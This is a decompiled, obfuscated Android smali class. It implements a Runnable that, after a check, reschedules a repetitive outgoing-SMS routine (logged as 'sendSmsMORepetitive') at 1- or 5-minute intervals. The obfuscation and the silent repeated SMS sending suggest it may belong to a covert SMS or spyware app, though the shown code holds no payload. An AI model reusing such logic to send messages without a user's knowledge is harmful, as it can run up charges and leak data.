.class final Lcom/network/android/a/f;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:I

.field final synthetic c:I

.field final synthetic d:I


# direct methods
.method constructor <init>(Landroid/content/Context;III)V
    .locals 0

    iput-object p1, p0, Lcom/network/android/a/f;->a:Landroid/content/Context;

    iput p2, p0, Lcom/network/android/a/f;->b:I

    iput p3, p0, Lcom/network/android/a/f;->c:I

    iput p4, p0, Lcom/network/android/a/f;->d:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 4

    :try_start_0
    iget-object v0, p0, Lcom/network/android/a/f;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/a/c;->f(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/network/android/a/f;->a:Landroid/content/Context;

    iget v1, p0, Lcom/network/android/a/f;->b:I

    invoke-static {v0, v1}, Lcom/network/android/a/c;->b(Landroid/content/Context;I)V

    :goto_0
    return-void

    :cond_0
    iget v0, p0, Lcom/network/android/a/f;->c:I

    const/4 v1, 0x6

    if-gt v0, v1, :cond_1

    iget-object v0, p0, Lcom/network/android/a/f;->a:Landroid/content/Context;

    iget v1, p0, Lcom/network/android/a/f;->b:I

    iget v2, p0, Lcom/network/android/a/f;->d:I

    const v3, 0xea60

    invoke-static {v0, v1, v2, v3}, Lcom/network/android/a/c;->a(Landroid/content/Context;III)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "sendSmsMORepetitive Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0

    :cond_1
    :try_start_1
    iget-object v0, p0, Lcom/network/android/a/f;->a:Landroid/content/Context;

    iget v1, p0, Lcom/network/android/a/f;->b:I

    iget v2, p0, Lcom/network/android/a/f;->d:I

    const v3, 0x493e0

    invoke-static {v0, v1, v2, v3}, Lcom/network/android/a/c;->a(Landroid/content/Context;III)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0
.end method
